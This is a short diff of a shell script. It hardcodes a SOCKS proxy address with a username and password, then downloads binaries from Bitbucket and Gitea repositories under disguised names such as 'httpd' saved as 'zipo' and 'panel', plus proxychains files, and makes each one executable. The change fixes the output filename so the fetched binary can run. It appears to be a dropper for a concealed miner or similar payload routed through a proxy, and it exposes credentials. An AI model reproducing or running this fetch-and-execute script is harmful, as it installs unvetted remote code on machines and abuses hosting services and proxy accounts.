@@ -2,7 +2,7 @@ proxy="50.17.160.202"
 port="1080" 
 user="xmz2ezv8ptf0u7"  
 pass="myrimhcl3pzcifqmj97c66pmx6" 
-wget -q -O vx https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x zipo
+wget -q -O zipo https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x zipo
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
